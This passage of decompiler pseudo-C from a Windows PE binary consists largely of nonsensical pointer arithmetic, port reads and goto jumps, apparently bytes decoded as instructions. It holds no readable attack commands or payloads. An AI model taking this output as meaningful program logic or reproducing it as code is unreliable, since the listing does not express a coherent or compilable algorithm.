cVar33;\n                            *(ppuVar101 + -4) = uVar128;\n                            iVar23 = *(ppuVar101 + -4);\n                            *0x42270038 = *0x42270038 - pcVar48;\n                            *(ppuVar101 + -4) = ppuVar101;\n                            uVar122 = (pcVar15 & 0xffffff00 | (pcVar15 & 0x35) - 0x27) ^ 0x45;\n                            pcVar15 = uVar122 & 0x33d45;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            pcVar15[0x41] = pcVar15[0x41] + cVar33;\n                            puVar36 = iVar37 + 1;\n                            *(ppuVar101 + -8) = puVar36;\n                            puVar16 = pcVar15 ^ 0x42;\n                            *puVar36 = *puVar36 ^ puVar19 + 1 >> 8;\n                            *(ppuVar101 + -0xb) = pcVar45;\n                            puVar19[0xe] = puVar19[0xe] ^ puVar36;\n                            uVar6 = puVar16;\n                            *puVar16 = *puVar16 + uVar6;\n                            uVar132 = *puVar16;\n                            *puVar16 = *puVar16 + uVar6;\n                            uVar132 = (uVar6 - 0x3a) - CARRY1(uVar132, uVar6);\n                            uVar38 = *(ppuVar101 + -10);\n                            puVar19 = pcVar45 + -*(uVar122 & 0x33d00 | uVar132);\n                            puVar28 = iVar37 + 2 + *(in_FS_OFFSET + iVar37 + 2);\n                            piVar123 = pcVar48 & *puVar19;\n                            uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                            uVar11 = CONCAT11(((uVar122 & 0x33d00) >> 8) + uVar7, uVar132 + uVar7 * '\\x06') & 0xff0f;\n                            puVar16 = uVar122 & 0x30000 | uVar11;\n                            cVar49 = uVar11;\n                            *puVar16 = *puVar16 + cVar49;\n                            puVar16[puVar28 * 2 + 0x35] = puVar16[puVar28 * 2 + 0x35] + puVar28;\n                            uVar122 = iVar23 + 1;\n                            puVar36 = uVar38 & 0xffffff00 | uVar38 ^ *(puVar19 + 0x31);\n                            *puVar16 = *puVar16 + cVar49;\n                            *puVar36 = *puVar36 + cVar33;\n                            *piVar123 = *piVar123 - (puVar26 >> 8);\n                            *(ppuVar101 + -10) = puVar36;\n                            ppiVar102 = ppuVar101 + -0xe;\n                            *(ppuVar101 + -0xe) = ppuVar101 + -10;\n                            *puVar26 = *puVar26 & puVar28 >> 8;\n                            if (*puVar26 == 0) {\n                                pcVar15 = CONCAT31(puVar16 >> 8, 0x5f) & 0xffffff4d;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                iVar23 = *(ppuVar101 + -0xe);\n                                *(ppuVar101 + -0xe) = puVar28;\n                                *puVar28 = *puVar28 ^ piVar123;\n                                *(ppuVar101 + -0x12) = puVar26 + 1;\n                                pcVar15 = *(ppuVar101 + -0x12);\n                                *(puVar19 + 0x39U) = *(puVar19 + 0x39U) ^ iVar23 - 1U;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                *(puVar28 + 0x26) = *(puVar28 + 0x26) + pcVar15;\n                                *(ppuVar101 + -0x11) = ppuVar101 + -0xd;\n                                puVar28 = *(ppuVar101 + -0x11);\n                                pcVar18 = *(ppuVar101 + -0xd);\n                                uVar122 = *(ppuVar101 + -9);\n                                piVar41 = *(ppuVar101 + 3);\n                                puVar36 = *(ppuVar101 + 7);\n                                uVar38 = *(ppuVar101 + 0xb);\n                                cVar49 = uVar38;\n                                pcVar15 = uVar38 & 0xffff0000 | CONCAT11((uVar38 >> 8) - *pcVar18, cVar49);\n                                iVar23 = *piVar41;\n                                iVar37 = -*0x4d5d2039;\n                                *pcVar15 = *pcVar15 + cVar49;\n                                *pcVar15 = *pcVar15 + cVar49;\n                                uVar27 = iVar23 * 0x28 + 1;\n                                uVar38 = *(iVar23 * 0x28 + 0x50);\n                                *puVar36 = *puVar36 ^ piVar41 >> 8;\n                                *(ppuVar101 + iVar37 + 0xc) = ppuVar101 + iVar37 + 0x10;\n                                piVar123 = pcVar18 ^ *0x4a464959;\n                                ppiVar102 = ppuVar101 + iVar37 + 8;\n                                *(ppuVar101 + iVar37 + 8) = uVar122;\n                                uVar17 = piVar41 - 1;\n                                puVar16 = (pcVar15 ^ uVar38 ^ 0x304f4945) - 1;\n                                puVar47 = uVar27 & 0xffff0000 | CONCAT11(uVar27 >> 8 ^ *puVar36, uVar27);\n                                uVar6 = puVar16;\n                                *puVar16 = *puVar16 + uVar6;\n                                uVar132 = *puVar16;\n                                *puVar16 = *puVar16 + uVar6;\n                                *piVar123 = (*piVar123 - (ppuVar101 + iVar37 + 8)) - CARRY1(uVar132, uVar6);\n                                *(ppuVar101 + iVar37 + 4) = uVar122;\n                                uVar38 = uVar17 & 0xffff0000 | CONCAT11((uVar17 >> 8) - *0x563d0624, uVar17);\n                                puVar16 = (puVar16 & 0xffffff21) - *(puVar16 & 0xffffff21);\n                                uVar6 = puVar16;\n                                *puVar16 = *puVar16 + uVar6;\n                                pcVar15 = uVar38 + 0x54;\n                                *pcVar15 = *pcVar15 + uVar27;\n                                *(puVar47 + 0x41) = *(puVar47 + 0x41) ^ puVar36;\n                                puVar46 = puVar36 + 1 ^ *(uVar38 + 0x55);\n                                puVar36 = *(ppuVar101 + iVar37 + 4);\n                                *puVar16 = *puVar16 + uVar6;\n                                uVar132 = *puVar16;\n                                *puVar16 = *puVar16 + uVar6;\n                                if (!CARRY1(uVar132, uVar6) && *puVar16 != 0) {\n                                    piVar123 = piVar123 ^ *puVar28;\n                                    puVar36 = puVar36 & 0xffff0000 | CONCAT11(puVar36 >> 8 | *0x173d5f5d, puVar36);\n                                    *puVar16 = *puVar16 + uVar6;\n                                    ppiVar102 = ppuVar101 + iVar37 + 4;\n                                    *(ppuVar101 + iVar37 + 4) = piVar123;\n                                    puVar26 = puVar47;\n                                    puVar19 = puVar28;\n                                    goto code_r0x00442e6f;\n                                }\ncode_r0x00442eb0:\n                                puVar16 = puVar46 + -1;\n                                *(ppiVar102 + 1) = puVar46 + -2;\n                                uVar122 = uVar122 - 1;\n                                *(ppiVar102 + -3) = puVar28;\n                                ppiVar102[-2] = puVar47;\n                                *0x5d0d4651 = *0x5d0d4651 + puVar36;\n                                uVar38 = *(puVar46 + 0x5b);\n                                ppiVar102[-3] = puVar16;\n                                uVar17 = (*ppiVar102 - 2U & uVar38) + 1;\n                                puVar36 = ppiVar102[-3];\n                                *puVar36 = *puVar36 ^ puVar36 >> 8;\n                                puVar47 = ppiVar102[-2];\n                                ppiVar102 = ppiVar102 + -1;\n                                uVar27 = uVar17 & 0xffffff13;\n                                puVar36[0x34] = puVar36[0x34] + puVar36;\n                                uVar38 = puVar16 & 0xffffff00 | puVar16 ^ *(uVar27 + 0x33);\n                                uVar7 = 9 < (uVar27 & 0xf) | uVar7;\n                                uVar17 = uVar17 & 0xffff0000 |\n                                         CONCAT11((uVar27 >> 8) + uVar7, uVar27 + uVar7 * '\\x06') & 0xff0f;\n                            }\n                            else {\ncode_r0x00442e6f:\n                                puVar47 = puVar26 + 1;\n                                puVar46 = *ppiVar102 + -1;\n                                *ppiVar102 = piVar123;\n                                uVar132 = *puVar16;\n                                uVar6 = puVar16;\n                                *puVar16 = *puVar16 + uVar6;\n                                puVar28 = puVar19 - 1U;\n                                if (*puVar16 == 0) goto code_r0x00442eb0;\n                                uVar7 = 9 < (uVar6 & 0xf) | uVar7;\n                                uVar8 = uVar6 + uVar7 * '\\x06';\n                                uVar8 = uVar8 + (0x90 < (uVar8 & 0xf0) | CARRY1(uVar132, uVar6) | uVar7 * (0xf9 < uVar8)\n                                                ) * '`';\n                                piVar41 = puVar16 & 0xffffff00 | uVar8;\n                                puVar28 = puVar19 + 3;\n                                uVar38 = in(puVar36);\n                                *(puVar19 - 1U) = uVar38;\n                                uVar6 = *puVar46;\n                                uVar10 = puVar36 >> 8;\n                                uVar132 = *puVar46;\n                                *puVar46 = *puVar46 - uVar10;\n                                uVar38 = *ppiVar102;\n                                if (!SBORROW1(uVar132, uVar10)) {\n                                    uVar17 = uVar8 & 0xffffff20;\n                                    pcVar15 = puVar16 & 0xffffff00 | uVar17;\n                                    cVar49 = uVar17;\n                                    *pcVar15 = *pcVar15 + cVar49;\n                                    *pcVar15 = *pcVar15 + cVar49;\n                                    puVar36 = puVar36 + 1U ^ puVar26[0x15] ^ *(uVar38 + 0x4e);\n                                    *pcVar15 = *pcVar15 + cVar49;\n                                    *pcVar15 = *pcVar15 + cVar49;\n                                    *puVar47 = *puVar47 | puVar28;\n                                    uVar132 = 9 < (cVar49 + 0xbfU & 0xf) | uVar7;\n                                    uVar11 = CONCAT11((puVar16 >> 8) + uVar132, cVar49 + 0xbfU + uVar132 * '\\x06') &\n                                             0xff0f;\n                                    *ppiVar102 = piVar123;\n                                    uVar6 = uVar11;\n                                    uVar7 = 9 < uVar6 | uVar132;\n                                    uVar6 = uVar6 + uVar7 * -6;\n                                    ppiVar102[-1] =\n                                         puVar16 & 0xffff0000 | uVar11 & 0xffffff00 |\n                                         uVar6 + (0x9f < uVar6 | uVar132 | uVar7 * (uVar6 < 6)) * -0x60;\n                                    puVar46 = uVar38 & 0xffffff00 | uVar38 - *(uVar122 + 5);\n                                    ppiVar102[-2] = puVar47;\n                                    ppiVar102 = ppiVar102 + -2 & *(piVar123 * 2);\n                                    goto code_r0x00442eb0;\n                                }\n                                iVar23 = *piVar41;\n                                *ppiVar102 = puVar36;\n                                uVar17 = (piVar41 + (uVar6 < uVar10) + iVar23 ^ 0x32) - 1;\n                                piVar123 = piVar123 ^ *puVar28;\n                            }\n                            puVar36 = puVar36 + -1;\n                            pcVar18 = piVar123 ^ *puVar47;\n                            *(ppiVar102 + -4) = uVar17 - 1;\n                            uVar17 = *(ppiVar102 + -4);\n                            *(ppiVar102 + -4) = uVar122;\n                            *(ppiVar102 + -8) = puVar28;\n                            *puVar36 = *puVar36 ^ puVar36 >> 8;\n                            pcVar15 = puVar36 ^ *(uVar38 + 0x50);\n                            uVar7 = 9 < (uVar17 & 0xf) | uVar7;\n                            puVar26 = uVar38 + 1;\n                            *(ppiVar102 + -0xc) = pcVar15;\n                            cVar49 = pcVar15;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *(pcVar15 + 0xe) =\n                                 *(pcVar15 + 0xe) ^\n                                 (uVar17 & 0xffff0000 |\n                                 CONCAT11((uVar17 >> 8) + uVar7, uVar17 + uVar7 * '\\x06') & 0xff0f);\n                            uVar17 = *(ppiVar102 + -0xc);\n                            uVar6 = puVar47 & *(uVar122 + 0x7b);\n                            puVar19 = puVar47 & 0xffffff00 | uVar6;\n                            uVar132 = uVar17 ^ 0x31;\n                            *(ppiVar102 + -8 + puVar28) = *(ppiVar102 + -8 + puVar28) & ppiVar102 + -8;\n                            ppuVar103 = ppiVar102 + -8 & *(puVar26 + puVar19 * 2);\n                            puVar28 = *ppuVar103;\n                            ppuVar104 = ppuVar103 + 1;\n                            uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                            uVar17 = uVar17 & 0xffff0000 |\n                                     CONCAT11((uVar17 >> 8) - uVar7, uVar132 + uVar7 * -6) & 0xff0f;\n                            uVar132 = CARRY4(*puVar28, puVar28);\n                            *puVar28 = *puVar28 + puVar28;\n                            if (-1 < *puVar28) {\n                                *(uVar122 + 0x54) = *(uVar122 + 0x54) + cVar49;\n                                puVar16 = (uVar17 & 0x55262d) - 1;\n                                *(pcVar18 + 0x38) = *(pcVar18 + 0x38) ^ puVar26;\n                                pcVar45 = puVar47 & 0xffffff00 | uVar6 ^ pcVar15[0x57];\n                                *ppuVar103 = pcVar18 + -1;\n                                ppuVar103[-1] = puVar26;\n                                ppuVar103[-2] = puVar16;\n                                uVar132 = pcVar15 + 1 >> 8;\n                                *puVar16 = *puVar16 ^ uVar132;\n                                ppuVar103[-3] = puVar26;\n                                puVar19 = pcVar45 + 1;\n                                *puVar19 = *puVar19 ^ uVar132;\n                                uVar128 = SUB42(pcVar15, 0);\n                                *puVar16 = *puVar16 ^ puVar16;\n                                *pcVar45 = *pcVar45 + cVar49;\n                                *(ppuVar103 + -4) = uVar130;\n                                iVar23 = ppuVar103[-4];\n                                uVar17 = (uVar17 & 0x55262d) + 0xd8a8f1d4;\n                                puVar26 = uVar38 - 1;\n                                uVar122 = uVar17 & 0x45721;\n                                *(uVar122 + 0x4f) = *(uVar122 + 0x4f) + cVar49;\n                                uVar7 = 9 < (uVar122 & 0xf) | uVar7;\n                                uVar17 = uVar17 & 0x40000;\n                                uVar38 = CONCAT11((uVar122 >> 8) + uVar7, uVar122 + uVar7 * '\\x06') & 0xff0f;\n                                uVar122 = uVar17 | uVar38;\n                                ppuVar103[-4] = iVar23;\n                                ppuVar103[-5] = pcVar45;\n                                ppuVar103[-6] = pcVar45;\n                                ppuVar103[-7] = uVar122;\n                                piVar123 = uVar122 ^ 0x41;\n                                pcVar18 = pcVar18 + -1;\n                                ppuVar105 = ppuVar103 + -8;\n                                ppuVar103[-8] = puVar28;\n                                uVar122 = iVar23 + 1;\n                                uVar132 = *piVar123;\n                                uVar6 = piVar123;\n                                *piVar123 = *piVar123 + uVar6;\n                                if (!CARRY1(uVar132, uVar6)) goto code_r0x00442f82;\n                                ppuVar104 = ppuVar103[-8] + 4;\n                                uVar122 = uVar122 ^ *puVar26;\n                                uVar7 = 9 < (uVar6 - 0x18 & 0xf) | uVar7;\n                                uVar6 = (uVar6 - 0x18) + uVar7 * -6;\n                                uVar132 = 0x9f < uVar6 | uVar7 * (uVar6 < 6);\n                                uVar17 = uVar17 | uVar38 & 0xffffff00 | uVar6 + uVar132 * -0x60;\n                            }\n                            uVar27 = *puVar19;\n                            uVar38 = *puVar19;\n                            *puVar19 = uVar38 + puVar28 + uVar132;\n                            *puVar26 = *puVar26 +\n                                       (CARRY4(uVar27, puVar28) || CARRY4(uVar38 + puVar28, uVar132)) *\n                                       ((uVar122 & 3) - (*puVar26 & 3));\n                            piVar123 = uVar17 ^ 0x32;\n                            pcVar45 = ppuVar104 + uVar122 * 2 + 0x26;\n                            *pcVar45 = *pcVar45 - cVar49;\n                            uVar122 = *ppuVar104;\n                            *piVar123 = *piVar123 - piVar123;\n                            *piVar123 = *piVar123 + piVar123;\n                            *0x4c493041 = *0x4c493041 + (pcVar15 >> 8);\n                            uVar128 = ppuVar104[1] + -1;\n                            ppuVar105 = ppuVar104 + 5;\n                            *(ppuVar104 + 5) = ppuVar104 + 9;\n                            *(piVar123 + 0x47) = *(piVar123 + 0x47) ^ ppuVar104[1] + -1;\n                            pcVar18 = pcVar18 + 1;\n                            puVar28 = puVar28 + -1;\ncode_r0x00442f82:\n                            *(piVar123 * 2) = *(piVar123 * 2) ^ puVar26;\n                            *piVar123 = *piVar123 + piVar123;\n                            uVar1 = in(uVar128);\n                            *puVar28 = uVar1;\n                            *(ppuVar105 + -4) = puVar28 + 1;\n                            uVar17 = puVar19 & 0xffffff00 | puVar19 - *pcVar18;\n                            iVar37 = *(ppuVar105 + -4);\n                            *(ppuVar105 + -4) = ppuVar105;\n                            puVar16 = piVar123 + -0x2f172919;\n                            uVar7 = 9 < (puVar16 & 0xf) | uVar7;\n                            uVar132 = puVar16 + uVar7 * -6;\n                            uVar132 = uVar132 + (0x9f < uVar132 | piVar123 < 0x2f172919 | uVar7 * (uVar132 < 6)) * -0x60\n                            ;\n                            uVar38 = puVar16 & 0xffffff00 | uVar132 & *(puVar16 & 0xffffff00 | uVar132);\n                            *(*(ppuVar105 + -4) + 0x56) = *(*(ppuVar105 + -4) + 0x56) ^ uVar17;\n                            *(ppuVar105 + -4) = puVar26;\n                            iVar23 = uVar17 + 1;\n                            *puVar26 = *puVar26 + iVar23;\n                            uVar17 = uVar38 + 0x8313f29;\n                            uVar132 = uVar17 + '\\'' + (0xf7cec0d5 < uVar38 - 1);\n                            pcVar15 = uVar17 & 0xffffff00 | uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *(ppuVar105 + -4) = ppuVar105;\n                            *(ppuVar105 + -8) = iVar37;\n                            puVar19 = *(ppuVar105 + -8);\n                            piVar123 = iVar37 + 1;\n                            *(ppuVar105 + -8) = pcVar15;\n                            *(ppuVar105 + -0xc) = puVar19;\n                            pcVar45 = pcVar18 + 1;\n                            puVar16 = puVar26 + -1;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            pcVar15 = puVar19 + iVar23 * 2 + 0x34;\n                            *pcVar15 = *pcVar15 + (iVar23 >> 8);\n                            *(ppuVar105 + -0x10) = ppuVar105 + -0xc;\n                            uVar38 = *(ppuVar105 + -0x10);\n                            uVar17 = *(ppuVar105 + -0xc);\n                            uVar7 = 9 < (uVar17 & 0xf) | uVar7;\n                            uVar11 = CONCAT11((uVar17 >> 8) - uVar7, uVar17 + uVar7 * -6) & 0xff0f;\n                            *piVar123 = *piVar123 - uVar38;\n                            *(ppuVar105 + -0xc) = pcVar45;\n                            puVar47 = uVar38 & 0xffffff00 | uVar38 | pcVar18[0x28];\n                            *(ppuVar105 + -0x10) = puVar16;\n                            *(ppuVar105 + -0x14) = uVar129;\n                            ppuVar106 = ppuVar105 + -0x14 ^ *puVar19;\n                            uVar132 = *(uVar17 & 0xffff0000 | uVar11);\n                            *0x43373557 = *0x43373557 ^ puVar19 >> 8;\n                            uVar38 = *(uVar122 + 0x4c);\n                            puVar19[0x13] = puVar19[0x13] ^ puVar19;\n                            puVar28 = *ppuVar106;\n                            uVar6 = *puVar16;\n                            uVar8 = puVar16;\n                            *puVar16 = *puVar16 + uVar8;\n                            *ppuVar106 = piVar123;\n                            uVar17 = ((uVar17 & 0xffff0000 | uVar11 & 0xffffff00 | uVar11 & uVar132) ^ uVar38 ^ 0x4a) +\n                                     0x13202525 + CARRY1(uVar6, uVar8);\n                            uVar7 = 9 < (uVar17 & 0xf) | uVar7;\n                            uVar11 = CONCAT11((uVar17 >> 8) + uVar7, uVar17 + uVar7 * '\\x06') & 0xff0f;\n                            puVar19 = puVar28 + 1;\n                            uVar132 = uVar11 - 0x2c;\n                            uVar38 = uVar11 & 0xffffff00;\n                            puVar16 = uVar17 & 0xffff0000 | uVar38 | uVar132;\n                            *puVar19 = *puVar19 ^ pcVar45;\n                            *(ppuVar106 + -3) = puVar16;\n                            puVar16 = uVar17 & 0xffff0000 | CONCAT11(uVar38 >> 8 ^ *puVar16, uVar132);\n                            pcVar18[0x33] = pcVar18[0x33] + uVar8;\n                            puVar32 = puVar26 + -2;\n                            *(ppuVar106 + -7) = puVar19;\n                            *puVar16 = *puVar16 ^ puVar19 >> 8;\n                            puVar107 = ppuVar106 + -6;\n                            puVar16 = puVar16 ^ 0x3741;\n                            if (puVar16 == NULL) {\n                                uVar38 = puVar32 & *0xb313528;\n                                pcVar45 = pcVar45 ^ _pe_dos_header;\n                                uVar132 = uVar7 * '\\x06';\n                                uVar132 = uVar132 + (0x90 < (uVar132 & 0xf0) |\n                                                    ppuVar106 + -6 < *(pcVar45 + uVar122) | uVar7 * (0xf9 < uVar132)) *\n                                                    '`';\n                                *(ppuVar106 + -10) = uVar130;\n                                *uVar132 = *uVar132 + uVar132;\n                                puVar16 = uVar132 ^ *(uVar38 + 0x57);\n                                puVar47 = puVar47 + -1;\n                                iVar23 = *(ppuVar106 + -10);\n                                *(ppuVar106 + -10) = ppuVar106 + -6;\n                                piVar123 = iVar37 + 2;\n                                puVar32 = iVar23 + -1;\n                                *(ppuVar106 + -0xe) = puVar28;\n                                *(ppuVar106 + -0x13) = piVar123;\n                                puVar107 = ppuVar106 + -0x17;\n                                *(ppuVar106 + -0x17) = piVar123;\n                                puVar19 = puVar28;\n                            }\n                            uVar132 = *puVar16;\n                            uVar6 = puVar16;\n                            *puVar16 = *puVar16 + uVar6;\n                            uVar132 = uVar6 + 0x4b + CARRY1(uVar132, uVar6);\n                            pcVar15 = puVar16 & 0xffffff00 | uVar132;\n                            *(puVar32 + 0x11) = *(puVar32 + 0x11) & pcVar45;\n                            *puVar32 = *puVar32 - (puVar19 + '\\x01');\n                            *pcVar15 = *pcVar15 + uVar132;\n                            uVar7 = 9 < (uVar132 & 0xf) | uVar7;\n                            uVar11 = CONCAT11(((puVar16 & 0xffffff00) >> 8) + uVar7, uVar132 + uVar7 * '\\x06') & 0xff0f;\n                            pcVar15 = puVar16 & 0xffff0000 | uVar11;\n                            *pcVar15 = *pcVar15 + uVar11;\n                            uVar122 = *puVar47;\n                            iVar115 = uVar122 * 0x33;\n                            *(puVar107 + -2) = uVar129;\n                            *(iVar115 + 0x21) = *(iVar115 + 0x21) + uVar122 * -0x33;\n                            *pcVar15 = *pcVar15 + (puVar47 >> 8);\n                            puVar16 = piVar123 + 1;\n                            piVar41 = *(puVar107 + -2);\n                            *(puVar107 + -2) = iVar115;\n                            *(puVar107 + -6) = puVar32;\n                            *(iVar115 + 0x56) = *(iVar115 + 0x56) + (*(puVar107 + -7) >> 8);\n                            *puVar16 = *puVar16 & puVar32;\n                            *puVar47 = *puVar47 & puVar16;\n                            uVar132 = *piVar41;\n                            uVar6 = piVar41 >> 8;\n                            *piVar41 = *piVar41 - uVar6;\n                            iVar37 = 2 - *piVar41;\n                            iVar23 = -(uVar132 < uVar6);\n                            uVar7 = 9 < (piVar41 & 0xf) | uVar7;\n                            uVar11 = CONCAT11(uVar6 + uVar7, piVar41 + uVar7 * '\\x06') & 0xff0f;\n                            pcVar15 = piVar41 & 0xffff0000 | uVar11;\n                            *(puVar107 + iVar23 + iVar37 + -9) = puVar16;\n                            cVar49 = uVar11;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *(puVar107 + iVar23 + iVar37 + -0xd) = puVar107 + iVar23 + iVar37 + -9;\n                            puVar26 = pcVar45 + -2;\n                            puVar16 = *(puVar107 + iVar23 + iVar37 + -0xd);\n                            uVar39 = *(puVar107 + iVar23 + iVar37 + -10);\n                            uVar132 = puVar16 ^ *puVar16;\n                            pcVar15 = puVar16 & 0xffffff00 | uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *piVar123 = *piVar123 + uVar39;\n                            *(puVar107 + iVar23 + iVar37 + -10) = puVar47 + 1;\n                            *(puVar107 + iVar23 + iVar37 + -10) = *(puVar107 + iVar23 + iVar37 + -10);\n                            pcVar15 = (puVar16 & 0xffffff00 | uVar132 + 0xbe) & 0x213f;\n                            cVar49 = pcVar15;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *(puVar107 + iVar23 + iVar37 + -0xd) = iVar115;\n                            *puVar26 = *puVar26 ^ puVar26;\n                            *(puVar107 + iVar23 + iVar37 + -0x11) = piVar123 + -2;\n                            *(puVar107 + iVar23 + iVar37 + -0x15) = puVar26;\n                            *(puVar107 + iVar23 + iVar37 + -0x1a) = uVar39;\n                            *(puVar107 + iVar23 + iVar37 + -0x1e) = puVar107 + iVar23 + iVar37 + -0x1a;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *(puVar107 + iVar23 + iVar37 + -0x1e) = iVar115 + -1;\n                            *(puVar107 + iVar23 + iVar37 + -0x22) = pcVar15;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            pcVar45 = *(puVar107 + iVar23 + iVar37 + -0x22);\n                            puVar28 = *(puVar107 + iVar23 + iVar37 + -0x1e);\n                            iVar115 = *(puVar107 + iVar23 + iVar37 + -0x1a);\n                            uVar17 = *(puVar107 + iVar23 + iVar37 + -0x12);\n                            uVar38 = *(puVar107 + iVar23 + iVar37 + -10);\n                            uVar6 = (*(puVar107 + iVar23 + iVar37 + -6) & 0x25) - *pcVar45;\n                            uVar122 = *(puVar107 + iVar23 + iVar37 + -6) & 0xffffff00;\n                            puVar16 = uVar122 | uVar6;\n                            **(puVar107 + iVar23 + iVar37 + -0xe) =\n                                 **(puVar107 + iVar23 + iVar37 + -0xe) - (uVar122 >> 8);\n                            uVar27 = uVar17 & 0xffff0000 | CONCAT11((uVar17 >> 8) - *puVar28, uVar17);\n                            *(puVar107 + iVar23 + iVar37 + -6) = uVar27;\n                            *puVar16 = *puVar16 + uVar6;\n                            uVar17 = (uVar38 & 0xffffff00 | uVar38 ^ *(uVar27 + 0x48)) - 1;\n                            *(puVar107 + iVar23 + iVar37 + -10) = pcVar45 + -1;\n                            uVar132 = *puVar16;\n                            *puVar16 = *puVar16 + uVar6;\n                            ppcVar119 = pcVar45 * 2;\n                            pcVar15 = *ppcVar119;\n                            pcVar18 = *ppcVar119;\n                            *ppcVar119 = pcVar18 + puVar28 + CARRY1(uVar132, uVar6);\n                            puVar16 = puVar16 + (CARRY4(pcVar15, puVar28) ||\n                                                CARRY4(pcVar18 + puVar28, CARRY1(uVar132, uVar6))) + 0x5c344421;\n                            puVar19 = uVar17 & 0xffff0000 | CONCAT11((uVar17 >> 8) - puVar16[uVar17], uVar17);\n                            uVar108 = puVar107 + iVar23 + iVar37 + -9 & *puVar28;\n                            iVar23 = (pcVar45 & *puVar19) + 1;\n                            *puVar16 = *puVar16 + puVar16;\n                            *puVar16 = *puVar16 + puVar16;\n                            *(uVar108 - 4) = puVar28;\n                            *(uVar108 - 8) = puVar19;\n                            ppcVar119 = uVar27 - 2;\n                            *(uVar108 - 0xc) = puVar28;\n                            *(uVar108 - 0x10) = uVar108 - 0xc;\n                            *(uVar108 - 0x14) = uVar108 - 0x10;\n                            *(uVar108 - 0x18) = iVar23;\n                            *(uVar108 - 0x1c) = ppcVar119;\n                            *(uVar108 - 0x20) = iVar23;\n                            *(uVar108 - 0x24) = puVar28 + 1;\n                            pcVar15 = puVar16 ^ 0x5343;\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            pcVar18 = *(uVar108 - 0x20);\n                            *(uVar27 + 0x44) = *(uVar27 + 0x44) + uVar132;\n                            *(uVar108 - 0x20) = puVar19;\n                            uVar10 = ppcVar119;\n                            *ppcVar119 = *ppcVar119 + uVar10;\n                            *ppcVar119 = *ppcVar119 + puVar28;\n                            uVar118 = iVar115 - 1U & *0x8;\n                            iVar23 = *(uVar108 - 0x20);\n                            *(uVar108 - 0x20) = uVar108 - 0x1c;\n                            iVar37 = *(uVar108 - 0x20);\n                            puVar26 = iVar23 + -1;\n                            uVar8 = puVar26;\n                            *puVar26 = *puVar26 + uVar8;\n                            *0x33200a34 = *0x33200a34 + uVar10;\n                            uVar34 = ppcVar119 >> 8;\n                            *ppcVar119 = *ppcVar119 & uVar34;\n                            uVar122 = *puVar26;\n                            uVar6 = 9 < (uVar8 & 0xf) | 9 < (uVar132 & 0xf) | uVar7;\n                            uVar38 = ((puVar26 & 0xffff0000 |\n                                      CONCAT11((puVar26 >> 8) + uVar6, uVar8 + uVar6 * '\\x06') & 0xff0f) ^ 0x26) +\n                                     0xe4cac1df;\n                            *pcVar18 = *pcVar18 - (uVar38 >> 8);\n                            *(puVar19 + 0x4d) = *(puVar19 + 0x4d) + uVar17 + -1;\n                            *(uVar108 - 0x1c) = uVar38 & 0x300c2c37 ^ 0x24;\n                            *(uVar108 - 0x20) = puVar28;\n                            iVar23 = *(uVar108 - 0x1c);\n                            *(uVar108 - 0x1c) = uVar108 - 0x18;\n                            *(uVar108 - 0x20) = uVar118 | uVar122;\n                            pcVar15 = iVar37 + -1;\n                            *(uVar108 - 0x24) = ppcVar119;\n                            *(uVar108 - 0x28) = iVar23 + -1;\n                            *(uVar108 - 0x2c) = ppcVar119;\n                            uVar39 = *(uVar108 - 0x2c);\n                            *(uVar108 - 0x2c) = uVar39;\n                            *(uVar108 - 0x30) = uVar108 - 0x2c;\n                            *(uVar108 - 0x34) = uVar39;\n                            *(uVar108 - 0x38) = pcVar15;\n                            uVar122 = *(uVar108 - 0x38);\n                            iVar23 = *(uVar108 - 0x30);\n                            *(pcVar15 * 3) = *(pcVar15 * 3) + uVar122;\n                            *ppcVar119 = *ppcVar119 & ppcVar119;\n                            iVar37 = *(uVar108 - 0x2c);\n                            iVar115 = *(uVar108 - 0x28);\n                            *(uVar108 - 0x28) = ppcVar119;\n                            *pcVar15 = *pcVar15 - (iVar23 + 1 >> 8);\n                            uVar122 = uVar122 ^ 0x3f | 0x253d563e;\n                            piVar123 = uVar122 & 0xffffff00 | uVar122 + 0xa8;\n                            *(pcVar18 + 0x37) = *(pcVar18 + 0x37) ^ ppcVar119;\n                            uVar122 = piVar123 - *piVar123;\n                            *(uVar27 + 0x35) = *(uVar27 + 0x35) + uVar122;\n                            *(uVar108 - 0x2c) = iVar37;\n                            puVar16 = uVar122 ^ 0x33;\n                            pcVar18 = *(uVar108 - 0x28);\n                            *(uVar108 - 0x27) = puVar16;\n                            pcVar18[0x57] = pcVar18[0x57] ^ pcVar18;\n                            piVar123 = *(uVar108 - 0x27);\n                            uVar132 = *puVar16;\n                            *puVar16 = *puVar16 + puVar16;\n                            *pcVar18 = *pcVar18 + (piVar123 >> 8) + CARRY1(uVar132, puVar16);\n                            uVar132 = pcVar18 ^ *piVar123;\n                            puVar19 = *(uVar108 - 0x23);\n                            puVar26 = uVar122 & 0xffffff00 | puVar16 & 0x37;\n                            *ppcVar119 = *ppcVar119 + -iVar115;\n                            uVar109 = uVar108 - 0x1f & *puVar26;\n                            *piVar123 = *piVar123 + iVar115;\n                            *puVar26 = *puVar26 + (puVar16 & 0x37);\n                            *(puVar19 + 0x4f) = *(puVar19 + 0x4f) + uVar132;\n                            *(uVar109 - 4) = puVar19;\n                            pcVar15 = puVar26 + -1;\n                            *(uVar109 - 8) = pcVar18 & 0xffffff00 | uVar132;\n                            uVar17 = *(uVar109 - 8);\n                            iVar23 = *(uVar109 - 4);\n                            *(uVar109 - 4) = uVar109;\n                            puVar36 = iVar23 + -1;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(iVar37 + 0x2d) = *(iVar37 + 0x2d) + uVar34;\n                            cVar49 